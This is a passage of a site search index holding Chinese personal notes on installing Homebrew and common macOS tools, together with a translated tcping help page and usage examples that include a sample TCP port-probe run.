\u5b98\u7f51\u4ecb\u7ecd\uff1a macOS\uff08\u6216 Linux\uff09\u7f3a\u5931\u7684\u8f6f\u4ef6\u5305\u7684\u7ba1\u7406\u5668 \u2014 Homebrew \u5b89\u88c5\u5e38\u7528\u8f6f\u4ef6 % export http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;export ALL_PROXY=socks5://127.0.0.1:1080 #\u8bbe\u7f6e\u7ec8\u7aef\u4ee3\u7406,\u6bcf\u6b21\u6253\u5f00\u65b0\u7684\u7ec8\u7aef\u90fd\u9700\u8981\u91cd\u65b0\u8bbe\u7f6e % brew install nmap % brew install tcping % brew install wget","title":"\u5b89\u88c5Homebrew"},{"location":"system/mac/%E8%BD%AF%E4%BB%B6/","text":"\u597d\u7528\u7684\u6587\u672c\u7f16\u8f91\u5668 coteditor/CotEditor: Lightweight Plain-Text Editor for macOS (github.com) \u7ec8\u7aef\u5de5\u5177 Eugeny/tabby: A terminal for a more modern age (github.com) \u7cfb\u7edf\u72b6\u6001\u76d1\u63a7\uff0c\u53ef\u4ee5\u67e5\u770b\u5145\u7535\u529f\u7387\uff0c\u98ce\u6247\u8f6c\u901f\uff0cCPU\u6e29\u5ea6\u4e4b\u7c7b\u7684 exelban/stats: macOS system monitor in your menu bar (github.com)","title":"\u5e38\u7528\u8f6f\u4ef6"},{"location":"system/windows/tcping/","text":"tcping \u4e0b\u8f7d\u5730\u5740\uff1ahttps://www.elifulkerson.com/projects/tcping.php tcping.exe --help tcping.exe \u7531 Eli Fulkerson \u5236\u4f5c \u8bf7\u8bbf\u95ee http://www.elifulkerson.com/projects/ \u83b7\u53d6\u66f4\u65b0\u3002 \u4f7f\u7528\u65b9\u6cd5: tcping.exe [-flags] \u670d\u52a1\u5668\u5730\u5740 [\u670d\u52a1\u5668\u7aef\u53e3] \u5b8c\u6574\u4f7f\u7528\u65b9\u6cd5: tcping.exe [-t] [-d] [-i interval] [-n times] [-w ms] [-b n] [-r times] [-s] [-v] [-j] [-js size] [-4] [-6] [-c] [-g count] [-S source_address] [--file] [--tee filename] [-h] [-u] [--post] [--head] [--proxy-port port] [--proxy-server server] [--proxy-credentials username:password] [-f] \u670d\u52a1\u5668\u5730\u5740 [\u670d\u52a1\u5668\u7aef\u53e3] -t : \u6301\u7eed ping \u76f4\u5230\u901a\u8fc7 control-c \u505c\u6b62 -n 5 : \u4f8b\u5982\uff0c\u53d1\u9001 5 \u6b21 ping -i 5 : \u4f8b\u5982\uff0c\u6bcf5\u79d2 ping \u4e00\u6b21 -w 0.5 : \u4f8b\u5982\uff0c\u7b49\u5f850.5\u79d2\u7684\u54cd\u5e94 -d : \u5728\u6bcf\u884c\u5305\u62ec\u65e5\u671f\u548c\u65f6\u95f4 -b 1 : \u542f\u7528\u8702\u9e23\u58f0 (1 \u8868\u793a\u4e0b\u7ebf\u65f6\u54cd\uff0c2 \u8868\u793a\u4e0a\u7ebf\u65f6\u54cd\uff0c 3 \u8868\u793a\u72b6\u6001\u53d8\u5316\u65f6\u54cd\uff0c4 \u8868\u793a\u603b\u662f\u54cd) -r 5 : \u4f8b\u5982\uff0c\u6bcf 5 \u6b21 ping \u91cd\u65b0\u67e5\u627e\u4e3b\u673a\u540d -s : \u6210\u529f ping \u65f6\u81ea\u52a8\u9000\u51fa -v : \u6253\u5370\u7248\u672c\u5e76\u9000\u51fa -j : \u5305\u62ec\u6296\u52a8\uff0c\u9ed8\u8ba4\u4f7f\u7528\u6eda\u52a8\u5e73\u5747\u503c -js 5 : \u5305\u62ec\u6296\u52a8\uff0c\u6eda\u52a8\u5e73\u5747\u503c\u5927\u5c0f\u4e3a5 (\u4f8b\u5982) --tee : \u5c06\u8f93\u51fa\u955c\u50cf\u5230 '--tee' \u540e\u6307\u5b9a\u7684\u6587\u4ef6\u540d --append : \u5411 '--tee' \u6587\u4ef6\u540d\u8ffd\u52a0\u800c\u975e\u8986\u76d6 -4 : \u4f18\u5148\u4f7f\u7528 ipv4 -6 : \u4f18\u5148\u4f7f\u7528 ipv6 -c : \u53ea\u5728\u72b6\u6001\u53d8\u5316\u65f6\u663e\u793a\u8f93\u51fa\u884c --file : \u5c06\u201c\u670d\u52a1\u5668\u5730\u5740\u201d\u89c6\u4e3a\u6587\u4ef6\u540d\uff0c\u9010\u884c\u5faa\u73af \u6ce8\u610f\uff1a--file \u4e0e\u5982 -j \u548c -c \u8fd9\u6837\u7684\u9009\u9879\u4e0d\u517c\u5bb9\uff0c\u56e0\u4e3a\u5b83\u6b63\u5728\u5faa\u73af\u4e0d\u540c\u7684\u76ee\u6807 \u53ef\u9009\u62e9\u63a5\u53d7\u670d\u52a1\u5668\u7aef\u53e3\u3002\u4f8b\u5982\uff0c\u201cexample.org 443\u201d\u662f\u6709\u6548\u7684\u3002 \u6216\u8005\uff0c\u4f7f\u7528 -p \u5728\u547d\u4ee4\u884c\u5f3a\u5236\u4e3a\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u5185\u5bb9\u6307\u5b9a\u7aef\u53e3\u3002 -g 5 : \u4f8b\u5982\uff0c\u5982\u679c\u8fde\u7eed\u5931\u8d255\u6b21\u5219\u653e\u5f03 -S _X_ : \u6307\u5b9a\u6e90\u5730\u5740 _X_\u3002\u6e90\u5730\u5740\u5fc5\u987b\u662f\u5ba2\u6237\u7aef\u8ba1\u7b97\u673a\u7684\u6709\u6548IP\u3002 -p _X_ : \u6307\u5b9a\u7aef\u53e3\u7684\u53e6\u4e00\u79cd\u65b9\u6cd5 --fqdn : \u6bcf\u884c\u6253\u5370\u57df\u540d\uff08\u5982\u679c\u53ef\u7528\uff09 --ansi : \u4f7f\u7528 ANSI \u989c\u8272\u5e8f\u5217\uff08cygwin\uff09 --color: \u4f7f\u7528 Windows \u989c\u8272\u5e8f\u5217 HTTP \u9009\u9879: -h : HTTP \u6a21\u5f0f\uff08\u4f7f\u7528\u4e0d\u5e26 http:// \u7684 url \u4f5c\u4e3a\u670d\u52a1\u5668\u5730\u5740\uff09 -u : \u6bcf\u884c\u5305\u62ec\u76ee\u6807 URL --post : \u4f7f\u7528 POST \u800c\u975e GET\uff08\u53ef\u80fd\u907f\u514d\u7f13\u5b58\uff09 --head : \u4f7f\u7528 HEAD \u800c\u975e GET --proxy-server : \u6307\u5b9a\u4ee3\u7406\u670d\u52a1\u5668 --proxy-port : \u6307\u5b9a\u4ee3\u7406\u7aef\u53e3 --proxy-credentials : \u4ee5\u7528\u6237\u540d:\u5bc6\u7801\u683c\u5f0f\u6307\u5b9a 'Proxy-Authorization: Basic' \u5934 \u8c03\u8bd5\u9009\u9879: -f : \u5f3a\u5236 tcping \u53d1\u9001\u81f3\u5c11\u4e00\u4e2a\u5b57\u8282 --header : \u5305\u62ec\u4e00\u4e2a\u5e26\u6709\u539f\u59cb\u53c2\u6570\u548c\u65e5\u671f\u7684\u5934\u90e8\u3002\u5982\u679c\u4f7f\u7528 --tee\uff0c\u5219\u9ed8\u8ba4\u5305\u542b\u3002 --block : \u4f7f\u7528 '\u963b\u585e' \u5957\u63a5\u5b57\u8fde\u63a5\u3002\u8fd9\u4f1a\u963b\u6b62 -w \u5de5\u4f5c\u5e76\u4f7f\u7528\u9ed8\u8ba4\u8d85\u65f6\uff08\u5728\u6211\u7684\u60c5\u51b5\u4e0b\u957f\u8fbe 20 \u79d2\uff09\u3002 \u4f46\u5b83\u53ef\u4ee5\u533a\u5206\u4e3b\u52a8\u62d2\u7edd\u7684\u8fde\u63a5\u4e0e\u8d85\u65f6\u3002 \u5982\u679c\u4f60\u4e0d\u4f20\u9012\u670d\u52a1\u5668\u7aef\u53e3\uff0c\u9ed8\u8ba4\u4e3a 80\u3002 tcping.exe \u662f\u4e00\u4e2a\u5728 Windows \u73af\u5883\u4e0b\u6a21\u62df ICMP ping \u529f\u80fd\u7684\u5de5\u5177\uff0c\u4e3b\u8981\u7528\u4e8e\u68c0\u6d4b TCP \u7aef\u53e3\u7684\u8fde\u901a\u6027\u3002\u5b83\u4e0d\u4ec5\u53ef\u4ee5\u6d4b\u8bd5\u7aef\u53e3\u662f\u5426\u5f00\u653e\uff0c\u8fd8\u80fd\u63d0\u4f9b\u5173\u4e8e\u5ef6\u8fdf\u548c\u54cd\u5e94\u65f6\u95f4\u7684\u4fe1\u606f\u3002\u4e0b\u9762\u662f\u4e00\u4e9b tcping.exe \u7684\u5e38\u7528\u7528\u6cd5\uff1a 1.\u57fa\u672c\u7684 TCP Ping \uff1a \u547d\u4ee4\uff1a tcping.exe [\u670d\u52a1\u5668\u5730\u5740] [\u7aef\u53e3] \u4f5c\u7528\uff1a\u68c0\u6d4b\u6307\u5b9a\u670d\u52a1\u5668\u5730\u5740\u7684\u6307\u5b9a\u7aef\u53e3\u662f\u5426\u5f00\u653e\u3002\u5982\u679c\u672a\u6307\u5b9a\u7aef\u53e3\uff0c\u9ed8\u8ba4\u4e3a 80 \u7aef\u53e3\u3002 \u793a\u4f8b\uff1a tcping.exe example.com 80 2.\u6301\u7eed Ping \uff1a \u547d\u4ee4\uff1a tcping.exe -t [\u670d\u52a1\u5668\u5730\u5740] [\u7aef\u53e3] \u4f5c\u7528\uff1a\u6301\u7eed\u68c0\u6d4b\u6307\u5b9a\u7aef\u53e3\u7684\u72b6\u6001\uff0c\u76f4\u5230\u7528\u6237\u624b\u52a8\u505c\u6b62\uff08\u4f7f\u7528 Ctrl + C\uff09\u3002 \u793a\u4f8b\uff1a tcping.exe -t example.com 80 3.\u8bbe\u7f6e Ping \u7684\u6b21\u6570 \uff1a \u547d\u4ee4\uff1a tcping.exe -n [\u6b21\u6570] [\u670d\u52a1\u5668\u5730\u5740] [\u7aef\u53e3] \u4f5c\u7528\uff1a\u8bbe\u7f6e\u8981\u53d1\u9001\u7684 ping \u6570\u91cf\u3002 \u793a\u4f8b\uff1a tcping.exe -n 5 example.com 80 4.\u8bbe\u7f6e Ping \u7684\u95f4\u9694\u65f6\u95f4 \uff1a \u547d\u4ee4\uff1a tcping.exe -i [\u95f4\u9694\u79d2\u6570] [\u670d\u52a1\u5668\u5730\u5740] [\u7aef\u53e3] \u4f5c\u7528\uff1a\u8bbe\u7f6e\u6bcf\u6b21 ping \u4e4b\u95f4\u7684\u95f4\u9694\u65f6\u95f4\uff08\u79d2\uff09\u3002 \u793a\u4f8b\uff1a tcping.exe -i 10 example.com 80 5.\u8bbe\u7f6e\u54cd\u5e94\u8d85\u65f6\u65f6\u95f4 \uff1a \u547d\u4ee4\uff1a tcping.exe -w [\u8d85\u65f6\u65f6\u95f4] [\u670d\u52a1\u5668\u5730\u5740] [\u7aef\u53e3] \u4f5c\u7528\uff1a\u8bbe\u7f6e\u7b49\u5f85\u54cd\u5e94\u7684\u8d85\u65f6\u65f6\u95f4\uff08\u79d2\uff09\u3002 \u793a\u4f8b\uff1a tcping.exe -w 2 example.com 80 6.HTTP \u6a21\u5f0f \uff1a \u547d\u4ee4\uff1a tcping.exe -h [\u670d\u52a1\u5668\u5730\u5740] \u4f5c\u7528\uff1a\u5728 HTTP \u6a21\u5f0f\u4e0b\u8fdb\u884c ping\uff0c\u53ef\u4ee5\u5bf9 HTTP \u670d\u52a1\u8fdb\u884c\u66f4\u5177\u9488\u5bf9\u6027\u7684\u68c0\u6d4b\u3002 \u793a\u4f8b\uff1a tcping.exe -h www.example.com 7.\u663e\u793a\u5e26\u65f6\u95f4\u6233\u7684 Ping \u7ed3\u679c \uff1a \u547d\u4ee4\uff1a tcping.exe -d [\u670d\u52a1\u5668\u5730\u5740] [\u7aef\u53e3] \u4f5c\u7528\uff1a\u5728\u6bcf\u6b21 ping \u7684\u8f93\u51fa\u4e2d\u5305\u542b\u65e5\u671f\u548c\u65f6\u95f4\u3002 \u793a\u4f8b\uff1a tcping.exe -d example.com 80 \u8fd9\u4e9b\u7528\u6cd5\u53ef\u4ee5\u6839\u636e\u60a8\u7684\u5177\u4f53\u9700\u6c42\u8fdb\u884c\u7ec4\u5408\u548c\u8c03\u6574\u3002 tcping \u662f\u4e00\u4e2a\u7075\u6d3b\u7684\u5de5\u5177\uff0c\u9002\u7528\u4e8e\u7f51\u7edc\u8bca\u65ad\u548c\u6d4b\u8bd5 TCP \u7aef\u53e3\u7684\u8fde\u901a\u6027\u3002\u8bf7\u8bb0\u4f4f\uff0c\u5bf9\u4e8e\u4e0d\u5c5e\u4e8e\u60a8\u7684\u670d\u52a1\u5668\u548c\u670d\u52a1\uff0c\u8fdb\u884c\u6b64\u7c7b\u6d4b\u8bd5\u65f6\u5e94\u786e\u4fdd\u60a8\u6709\u9002\u5f53\u7684\u6743\u9650\u548c\u5408\u6cd5\u6027\u3002 tcping \u548c\u4f20\u7edf\u7684 ping \u547d\u4ee4\u5728\u529f\u80fd\u548c\u7528\u9014\u4e0a\u6709\u4e00\u4e9b\u5173\u952e\u533a\u522b\uff1a 1.\u534f\u8bae \uff1a ping \uff1a\u4f7f\u7528 ICMP (Internet Control Message Protocol) \u534f\u8bae\u3002\u5b83\u53d1\u9001 ICMP Echo Request \u6d88\u606f\u5230\u76ee\u6807\u5730\u5740\uff0c\u5982\u679c\u76ee\u6807\u54cd\u5e94\uff0c\u5219\u8fd4\u56de ICMP Echo Reply\u3002 tcping \uff1a\u4f7f\u7528 TCP (Transmission Control Protocol) \u534f\u8bae\u3002\u5b83\u5c1d\u8bd5\u5efa\u7acb\u5230\u76ee\u6807\u5730\u5740\u7684 TCP \u8fde\u63a5\uff08\u901a\u5e38\u662f\u5230\u6307\u5b9a\u7684\u7aef\u53e3\uff09\u3002 2.\u7528\u9014 \uff1a ping \uff1a\u4e3b\u8981\u7528\u4e8e\u68c0\u6d4b\u7f51\u7edc\u8fde\u901a\u6027\u3002\u5b83\u53ef\u4ee5\u544a\u8bc9\u60a8\u76ee\u6807\u673a\u5668\u662f\u5426\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\uff0c\u5e76\u63d0\u4f9b\u5f80\u8fd4\u65f6\u95f4 (RTT) \u6570\u636e\u3002 tcping \uff1a\u4e3b\u8981\u7528\u4e8e\u68c0\u6d4b\u7279\u5b9a TCP \u7aef\u53e3\u7684\u53ef\u8fbe\u6027\u548c\u54cd\u5e94\u65f6\u95f4\u3002\u5b83\u5bf9\u4e8e\u68c0\u6d4b\u7279\u5b9a\u670d\u52a1\uff08\u5982 HTTP\u3001\u6570\u636e\u5e93\u670d\u52a1\u7b49\uff09\u662f\u5426\u8fd0\u884c\u6216\u76d1\u542c\u7279\u5b9a\u7aef\u53e3\u975e\u5e38\u6709\u7528\u3002 3.\u9632\u706b\u5899\u548c\u8fc7\u6ee4 \uff1a ping \uff1a\u8bb8\u591a\u7cfb\u7edf\u548c\u7f51\u7edc\u4f1a\u963b\u6b62\u6216\u8fc7\u6ee4 ICMP \u6d41\u91cf\uff0c\u8fd9\u610f\u5473\u7740\u5373\u4f7f\u7cfb\u7edf\u5728\u7ebf\uff0cping \u4e5f\u53ef\u80fd\u5931\u8d25\u3002 tcping \uff1a\u7531\u4e8e\u8bb8\u591a\u5e94\u7528\u548c\u670d\u52a1\u4f9d\u8d56\u4e8e TCP \u8fde\u63a5\uff0cTCP \u7aef\u53e3\u901a\u5e38\u4e0d\u4f1a\u88ab\u963b\u6b62\u3002\u56e0\u6b64\uff0ctcping \u66f4\u6709\u53ef\u80fd\u5f97\u5230\u51c6\u786e\u7684\u7aef\u53e3\u53ef\u8fbe\u6027\u4fe1\u606f\u3002 4.\u8f93\u51fa\u4fe1\u606f \uff1a ping \uff1a\u63d0\u4f9b\u4e86\u76ee\u6807\u5730\u5740\u7684\u53ef\u8fbe\u6027\u3001\u6570\u636e\u5305\u5f80\u8fd4\u65f6\u95f4\u3001\u4e22\u5305\u4fe1\u606f\u7b49\u3002 tcping \uff1a\u63d0\u4f9b\u4e86\u7aef\u53e3\u7684\u5f00\u653e\u72b6\u6001\u3001\u5efa\u7acb\u8fde\u63a5\u7684\u65f6\u95f4\u7b49\uff0c\u66f4\u9002\u5408\u68c0\u6d4b\u7279\u5b9a\u670d\u52a1\u7684\u72b6\u6001\u3002 \u603b\u7ed3\u6765\u8bf4\uff0c ping \u662f\u68c0\u6d4b\u7f51\u7edc\u5c42\u7684\u8fde\u901a\u6027\u548c\u8d28\u91cf\u7684\u5de5\u5177\uff0c\u800c tcping \u662f\u68c0\u6d4b\u7279\u5b9a TCP \u7aef\u53e3\uff08\u56e0\u6b64\u662f\u7279\u5b9a\u670d\u52a1\uff09\u7684\u53ef\u8fbe\u6027\u548c\u54cd\u5e94\u65f6\u95f4\u7684\u5de5\u5177\u3002\u5728\u8bca\u65ad\u7f51\u7edc\u95ee\u9898\u65f6\uff0c\u4e24\u8005\u53ef\u4ee5\u4e92\u4e3a\u8865\u5145\u3002 \u547d\u4ee4\u7ed3\u679c\uff1a C:\\Users\\yinzhipeng>tcping.exe 172.61.222.51 80 Probing 171.220.227.81:80/tcp - Port is open - time=9.747ms Probing 171.220.227.81:80/tcp - Port is open - time=7.875ms Probing 171.220.227.81:80/tcp - Port is open - time=8.482ms Probing 171.220.227.81:80/tcp - Port is open - time=8.327ms Ping statistics for 171.220.227.81:80 4 probes sent. 4 successful, 0 failed. (0.00% fail) Approximate trip times in milli-seconds: Minimum = 7.875ms, Maximum = 9.747ms, Average = 8.608ms \u9010\u884c\u7ffb\u8bd1\u4e00\u4e0b: \u6b63\u5728\u63a2\u6d4b 171.220.227.81:80/tcp - \u7aef\u53e3\u662f\u5f00\u653e\u7684 - \u65f6\u95f4=9.747\u6beb\u79d2 \u6b63\u5728\u63a2\u6d4b 171.220.227.81:80/tcp - \u7aef\u53e3\u662f\u5f00\u653e\u7684 - \u65f6\u95f4=7.875\u6beb\u79d2 \u6b63\u5728\u63a2\u6d4b 171.220.227.81:80/tcp - \u7aef\u53e3\u662f\u5f00\u653e\u7684 - \u65f6\u95f4=8.482\u6beb\u79d2 \u6b63\u5728\u63a2\u6d4b 171.220.227.81:80/tcp - \u7aef\u53e3\u662f\u5f00\u653e\u7684 - \u65f6\u95f4=8.327\u6beb\u79d2 \u5bf9 171.220.227.81:80 \u7684 Ping \u7edf\u8ba1\u6570\u636e \u5df2\u53d1\u9001 4 \u4e2a\u63a2\u6d4b\u5305\u3002 4 \u6b21\u6210\u529f\uff0c0 \u6b21\u5931\u8d25\u3002 (\u5931\u8d25\u7387 0.00%) \u5927\u7ea6\u7684\u5f80\u8fd4\u65f6\u95f4\uff08\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\uff09\uff1a \u6700\u5c0f\u503c = 7.875\u6beb\u79d2\uff0c\u6700\u5927\u503c = 9.747\u6beb\u79d2\uff0c\u5e73\u5747\u503c = 8.608\u6beb\u79d2","title":"tcping"},{"location":"system/windows/tcping/#tcping","text":"\u4e0b\u8f7d\u5730\u5740\uff1ahttps://www.elifulkerson.com/projects/tcping.php tcping.exe --help tcping.exe \u7531 Eli Fulkerson \u5236\u4f5c \u8bf7\u8bbf\u95ee http://www.elifulkerson.com/projects/ \u83b7\u53d6\u66f4\u65b0\u3002 \u4f7f\u7528\u65b9\u6cd5: tcping.exe [-flags] \u670d\u52a1\u5668\u5730\u5740 [\u670d\u52a1\u5668\u7aef\u53e3] \u5b8c\u6574\u4f7f\u7528\u65b9\u6cd5: tcping.exe [-t] [-d] [-i interval] [-n times] [-w ms] [-b n] [-r times] [-s] [-v] [-j] [-js size] [-4] [-6] [-c] [-g count] [-S source_address] [--file] [--tee filename] [-h] [-u] [--post] [--head] [--proxy-port port] [--proxy-server server] [--proxy-credentials username:password] [-f] \u670d\u52a1\u5668\u5730\u5740 [\u670d\u52a1\u5668\u7aef\u53e3] -t : \u6301\u7eed ping \u76f4\u5230\u901a\u8fc7 control-c \u505c\u6b62 -n 5 : \u4f8b\u5982\uff0c\u53d1\u9001 5 \u6b21 ping -i 5 : \u4f8b\u5982\uff0c\u6bcf5\u79d2 ping \u4e00\u6b21 -w 0.5 : \u4f8b\u5982\uff0c\u7b49\u5f850.5\u79d2\u7684\u54cd\u5e94 -d : \u5728\u6bcf\u884c\u5305\u62ec\u65e5\u671f\u548c\u65f6\u95f4 -b 1 : \u542f\u7528\u8702\u9e23\u58f0 (1 \u8868\u793a\u4e0b\u7ebf\u65f6\u54cd\uff0c2 \u8868\u793a\u4e0a\u7ebf\u65f6\u54cd\uff0c 3 \u8868\u793a\u72b6\u6001\u53d8\u5316\u65f6\u54cd\uff0c4 \u8868\u793a\u603b\u662f\u54cd) -r 5 : \u4f8b\u5982\uff0c\u6bcf 5 \u6b21 ping \u91cd\u65b0\u67e5\u627e\u4e3b\u673a\u540d -s : \u6210\u529f ping \u65f6\u81ea\u52a8\u9000\u51fa -v : \u6253\u5370\u7248\u672c\u5e76\u9000\u51fa -j : \u5305\u62ec\u6296\u52a8\uff0c\u9ed8\u8ba4\u4f7f\u7528\u6eda\u52a8\u5e73\u5747\u503c -js 5 : \u5305\u62ec\u6296\u52a8\uff0c\u6eda\u52a8\u5e73\u5747\u503c\u5927\u5c0f\u4e3a5 (\u4f8b\u5982) --tee : \u5c06\u8f93\u51fa\u955c\u50cf\u5230 '--tee' \u540e\u6307\u5b9a\u7684\u6587\u4ef6\u540d --append : \u5411 '--tee' \u6587\u4ef6\u540d\u8ffd\u52a0\u800c\u975e\u8986\u76d6 -4 : \u4f18\u5148\u4f7f\u7528 ipv4 -6 : \u4f18\u5148\u4f7f\u7528 ipv6 -c : \u53ea\u5728\u72b6\u6001\u53d8\u5316\u65f6\u663e\u793a\u8f93\u51fa\u884c --file : \u5c06\u201c\u670d\u52a1\u5668\u5730\u5740\u201d\u89c6\u4e3a\u6587\u4ef6\u540d\uff0c\u9010\u884c\u5faa\u73af \u6ce8\u610f\uff1a--file \u4e0e\u5982 -j \u548c -c \u8fd9\u6837\u7684\u9009\u9879\u4e0d\u517c\u5bb9\uff0c\u56e0\u4e3a\u5b83\u6b63\u5728\u5faa\u73af\u4e0d\u540c\u7684\u76ee\u6807 \u53ef\u9009\u62e9\u63a5\u53d7\u670d\u52a1\u5668\u7aef\u53e3\u3002\u4f8b\u5982\uff0c\u201cexample.org 443\u201d\u662f\u6709\u6548\u7684\u3002 \u6216\u8005\uff0c\u4f7f\u7528 -p \u5728\u547d\u4ee4\u884c\u5f3a\u5236\u4e3a\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u5185\u5bb9\u6307\u5b9a\u7aef\u53e3\u3002 -g 5 : \u4f8b\u5982\uff0c\u5982\u679c\u8fde\u7eed\u5931\u8d255\u6b21\u5219\u653e\u5f03 -S _X_ : \u6307\u5b9a\u6e90\u5730\u5740 _X_\u3002\u6e90\u5730\u5740\u5fc5\u987b\u662f\u5ba2\u6237\u7aef\u8ba1\u7b97\u673a\u7684\u6709\u6548IP\u3002 -p _X_ : \u6307\u5b9a\u7aef\u53e3\u7684\u53e6\u4e00\u79cd\u65b9\u6cd5 --fqdn : \u6bcf\u884c\u6253\u5370\u57df\u540d\uff08\u5982\u679c\u53ef\u7528\uff09 --ansi : \u4f7f\u7528 ANSI \u989c\u8272\u5e8f\u5217\uff08cygwin\uff09 --color: \u4f7f\u7528 Windows \u989c\u8272\u5e8f\u5217 HTTP \u9009\u9879: -h : HTTP \u6a21\u5f0f\uff08\u4f7f\u7528\u4e0d\u5e26 http:// \u7684 url \u4f5c\u4e3a\u670d\u52a1\u5668\u5730\u5740\uff09 -u : \u6bcf\u884c\u5305\u62ec\u76ee\u6807 URL --post : \u4f7f\u7528 POST \u800c\u975e GET\uff08\u53ef\u80fd\u907f\u514d\u7f13\u5b58\uff09 --head : \u4f7f\u7528 HEAD \u800c\u975e GET --proxy-server : \u6307\u5b9a\u4ee3\u7406\u670d\u52a1\u5668 --proxy-port : \u6307\u5b9a\u4ee3\u7406\u7aef\u53e3 --proxy-credentials : \u4ee5\u7528\u6237\u540d:\u5bc6\u7801\u683c\u5f0f\u6307\u5b9a 'Proxy-Authorization: Basic' \u5934 \u8c03\u8bd5\u9009\u9879: -f : \u5f3a\u5236 tcping \u53d1\u9001\u81f3\u5c11\u4e00\u4e2a\u5b57\u8282 --header : \u5305\u62ec\u4e00\u4e2a\u5e26\u6709\u539f\u59cb\u53c2\u6570\u548c\u65e5\u671f\u7684\u5934\u90e8\u3002\u5982\u679c\u4f7f\u7528 --tee\uff0c\u5219\u9ed8\u8ba4\u5305\u542b\u3002 --block : \u4f7f\u7528 '\u963b\u585e' \u5957\u63a5\u5b57\u8fde\u63a5\u3002\u8fd9\u4f1a\u963b\u6b62 -w \u5de5\u4f5c\u5e76\u4f7f\u7528\u9ed8\u8ba4\u8d85\u65f6\uff08\u5728\u6211\u7684\u60c5\u51b5\u4e0b\u957f\u8fbe 20 \u79d2\uff09\u3002 \u4f46\u5b83\u53ef\u4ee5\u533a\u5206\u4e3b\u52a8\u62d2\u7edd\u7684\u8fde\u63a5\u4e0e\u8d85\u65f6\u3002 \u5982\u679c\u4f60\u4e0d\u4f20\u9012\u670d\u52a1\u5668\u7aef\u53e3\uff0c\u9ed8\u8ba4\u4e3a 80\u3002 tcping.exe \u662f\u4e00\u4e2a\u5728 Windows \u73af\u5883\u4e0b\u6a21\u62df ICMP ping \u529f\u80fd\u7684\u5de5\u5177\uff0c\u4e3b\u8981\u7528\u4e8e\u68c0\u6d4b TCP \u7aef\u53e3\u7684\u8fde\u901a\u6027\u3002\u5b83\u4e0d\u4ec5\u53ef\u4ee5\u6d4b\u8bd5\u7aef\u53e3\u662f\u5426\u5f00\u653e\uff0c\u8fd8\u80fd\u63d0\u4f9b\u5173\u4e8e\u5ef6\u8fdf\u548c\u54cd\u5e94\u65f6\u95f4\u7684\u4fe1\u606f\u3002\u4e0b\u9762\u662f\u4e00\u4e9b tcping.exe \u7684\u5e38\u7528\u7528\u6cd5\uff1a 1.\u57fa\u672c\u7684 TCP Ping \uff1a \u547d\u4ee4\uff1a tcping.exe [\u670d\u52a1\u5668\u5730\u5740] [\u7aef\u53e3] \u4f5c\u7528\uff1a\u68c0\u6d4b\u6307\u5b9a\u670d\u52a1\u5668\u5730\u5740\u7684\u6307\u5b9a\u7aef\u53e3\u662f\u5426\u5f00\u653e\u3002\u5982\u679c\u672a\u6307\u5b9a\u7aef\u53e3\uff0c\u9ed8\u8ba4\u4e3a 80 \u7aef\u53e3\u3002 \u793a\u4f8b\uff1a tcping.exe example.com 80 2.\u6301\u7eed Ping \uff1a \u547d\u4ee4\uff1a tcping.exe -t [\u670d\u52a1\u5668\u5730\u5740] [\u7aef\u53e3] \u4f5c\u7528\uff1a\u6301\u7eed\u68c0\u6d4b\u6307\u5b9a\u7aef\u53e3\u7684\u72b6\u6001\uff0c\u76f4\u5230\u7528\u6237\u624b\u52a8\u505c\u6b62\uff08\u4f7f\u7528 Ctrl + C\uff09\u3002 \u793a\u4f8b\uff1a tcping.exe -t example.com 80 3.\u8bbe\u7f6e Ping \u7684\u6b21\u6570 \uff1a \u547d\u4ee4\uff1a tcping.exe -n [\u6b21\u6570] [\u670d\u52a1\u5668\u5730\u5740] [\u7aef\u53e3] \u4f5c\u7528\uff1a\u8bbe\u7f6e\u8981\u53d1\u9001\u7684 ping \u6570\u91cf\u3002 \u793a\u4f8b\uff1a tcping.exe -n 5 example.com 80 4.\u8bbe\u7f6e Ping \u7684\u95f4\u9694\u65f6\u95f4 \uff1a \u547d\u4ee4\uff1a tcping.exe -i [\u95f4\u9694\u79d2\u6570] [\u670d\u52a1\u5668\u5730\u5740] [\u7aef\u53e3] \u4f5c\u7528\uff1a\u8bbe\u7f6e\u6bcf\u6b21 ping \u4e4b\u95f4\u7684\u95f4\u9694\u65f6\u95f4\uff08\u79d2\uff09\u3002 \u793a\u4f8b\uff1a tcping.exe -i 10 example.com 80 5.\u8bbe\u7f6e\u54cd\u5e94\u8d85\u65f6\u65f6\u95f4 \uff1a \u547d\u4ee4\uff1a tcping.exe -w [\u8d85\u65f6\u65f6\u95f4] [\u670d\u52a1\u5668\u5730\u5740] [\u7aef\u53e3] \u4f5c\u7528\uff1a\u8bbe\u7f6e\u7b49\u5f85\u54cd\u5e94\u7684\u8d85\u65f6\u65f6\u95f4\uff08\u79d2\uff09\u3002 \u793a\u4f8b\uff1a tcping.exe -w 2 example.com 80 6.HTTP \u6a21\u5f0f \uff1a \u547d\u4ee4\uff1a tcping.exe -h [\u670d\u52a1\u5668\u5730\u5740] \u4f5c\u7528\uff1a\u5728 HTTP \u6a21\u5f0f\u4e0b\u8fdb\u884c ping\uff0c\u53ef\u4ee5\u5bf9 HTTP \u670d\u52a1\u8fdb\u884c\u66f4\u5177\u9488\u5bf9\u6027\u7684\u68c0\u6d4b\u3002 \u793a\u4f8b\uff1a tcping.exe -h www.example.com 7.\u663e\u793a\u5e26\u65f6\u95f4\u6233\u7684 Ping \u7ed3\u679c \uff1a \u547d\u4ee4\uff1a tcping.exe -d [\u670d\u52a1\u5668\u5730\u5740] [\u7aef\u53e3] \u4f5c\u7528\uff1a\u5728\u6bcf\u6b21 ping \u7684\u8f93\u51fa\u4e2d\u5305\u542b\u65e5\u671f\u548c\u65f6\u95f4\u3002 \u793a\u4f8b\uff1a tcping.exe -d example.com 80 \u8fd9\u4e9b\u7528\u6cd5\u53ef\u4ee5\u6839\u636e\u60a8\u7684\u5177\u4f53\u9700\u6c42\u8fdb\u884c\u7ec4\u5408\u548c\u8c03\u6574\u3002 tcping \u662f\u4e00\u4e2a\u7075\u6d3b\u7684\u5de5\u5177\uff0c\u9002\u7528\u4e8e\u7f51\u7edc\u8bca\u65ad\u548c\u6d4b\u8bd5 TCP 